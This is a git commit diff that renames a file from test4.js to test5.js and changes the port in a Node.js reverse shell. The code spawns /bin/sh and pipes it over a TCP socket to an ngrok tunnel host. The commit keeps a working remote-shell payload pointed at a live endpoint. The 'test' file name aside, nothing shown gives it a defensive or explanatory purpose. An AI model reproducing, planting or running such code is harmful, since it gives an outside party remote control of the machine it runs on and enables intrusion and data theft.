7b03f2c87e5800a633acf99e928c6bc225319163
addndata <111285262+addndata@users.noreply.github.com>
2024-05-31 20:23:48 +0300

    Update and rename test4.js to test5.js

--- test5.js
+++ test5.js
@@ -3,7 +3,7 @@
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(17381, "0.tcp.eu.ngrok.io", function(){
+    client.connect(12411, "0.tcp.eu.ngrok.io", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
